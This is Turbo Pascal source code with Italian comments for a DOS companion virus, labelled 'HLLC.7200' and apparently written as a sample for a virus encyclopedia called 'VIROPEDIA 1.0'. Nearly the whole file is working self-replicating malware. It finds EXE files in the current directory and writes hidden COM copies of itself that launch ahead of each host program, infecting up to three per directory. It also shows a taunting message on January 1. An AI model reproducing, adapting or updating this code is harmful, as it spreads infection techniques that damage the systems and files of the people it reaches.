{$M 1024,0,1024}       {Direttive al compilatore per ottimizzare l'uso
                        di memoria RAM}

{Type: COMPANION VIRUS
 Desc: Ricerca e infetta 1 file EXE, creando il file COM
       corrispondente con una copia del virus. Ogni dir
       contiene al massimo 3 file EXE infetti}

PROGRAM VIROPEDIA1;
USES DOS,CRT,STRINGS;
TYPE CHARFILE=FILE OF CHAR;

VAR File1,File2: SearchRec;
    VirFile: string[12];
    F,G: CHARFILE;
    anno, mese, giorno, nomegiorno: Word;

{Ricava il nome del file COM dall'EXE trovato}
PROCEDURE ConverteNomeEXE(VAR File1:SearchRec);
VAR i:integer;
BEGIN
i:=0;
WHILE (i<=8) AND (File1.Name[i]<>'.') DO BEGIN
      VirFile[i]:=File1.Name[i];
      inc(i);
      END;
virfile[i]:='.';
virfile[i+1]:='C';
virfile[i+2]:='O';
virfile[i+3]:='M';
END;

{Riceve un file Sorgente e uno Destinazione e li copia}
PROCEDURE CopiaFile(VAR S,D:CHARFILE);
VAR byte:char;
BEGIN
ASSIGN(D,VirFile); ASSIGN(S,File2.Name);
REWRITE(D); RESET(S);
WHILE NOT EOF(S) DO BEGIN
      READ(S,byte);
      WRITE(D,byte);
      END;
CLOSE(S); CLOSE(D);
END;

{Modifica il file COM per eseguire l'applicazione ospite}
PROCEDURE ModificaFile(VAR F:CHARFILE);
VAR i:integer; byte:char;
BEGIN
RESET(F);
SEEK(F,1081);
i:=0;
WHILE (i<=8) AND (File1.Name[i]<>'.') DO BEGIN
      WRITE(F,File1.Name[i]);
      inc(i);
      END;

byte:='.'; WRITE(F,byte);
byte:='E'; WRITE(F,byte);
byte:='X'; WRITE(F,byte);
byte:='E'; WRITE(F,byte);
byte:=chr(00); WRITE(F,byte);
CLOSE(F);
END;


{Main}
BEGIN
ClrScr;                                         {cancella lo schermo}
FindFirst('*.EXE', Archive, File1);          {cerca il primo file EXE}

{se Š stato trovato almeno un file EXE si prosegue}
IF DosError = 0 THEN BEGIN

ConverteNomeEXE(File1);
{Vede se esiste gi… un COM nascosto, quindi il file Š gi… infetto}
FindFirst(VirFile, Hidden, File2);

{se non esiste c'Š errore e si pu• procedere con l'infezione}
IF DosError<>0 THEN BEGIN
                    FindFirst('*.COM', Hidden, File2);
                    CopiaFile(G,F);
                    ModificaFile(F);
                    SetFAttr(F, 34);
                    END

ELSE BEGIN
     {se il primo EXE Š gi… infetto cerca il secondo EXE}
     FindNext(File1);
     ConverteNomeEXE(File1);
     FindFirst(VirFile, Hidden, File2);
     IF DosError<>0 THEN BEGIN
                         FindFirst('*.COM', Hidden, File2);
                         CopiaFile(G,F);
                         ModificaFile(F);
                         SetFAttr(F, 34);
                         END
     ELSE BEGIN
          {se il secondo EXE Š gi… infetto cerca il terzo EXE}
          FindNext(File1);
          ConverteNomeEXE(File1);
          FindFirst(VirFile, Hidden, File2);
          IF DosError<>0 THEN BEGIN
                              FindFirst('*.COM', Hidden, File2);
                              CopiaFile(G,F);
                              ModificaFile(F);
                              SetFAttr(F, 34);
                              END;

          END;
     END;
END;

{routine di attivazione "payload}
GetDate(anno,mese,giorno,nomegiorno);
IF (mese=1) AND (giorno=1) THEN BEGIN
                                CLRSCR;
                                WRITELN('Date:',giorno,'/',mese,'/',anno);
                                WRITELN('Right Moment to Buy an Antivirus!');
                                WRITELN;
                                WRITELN('HLLC.7200 Companion Virus');
                                WRITELN('Pascal Sample Written for VIROPEDIA 1.0');
                                READLN;
                                END;

{ritorna all'esecuzione del programma originale}
Exec('12345678.EXE','');
END.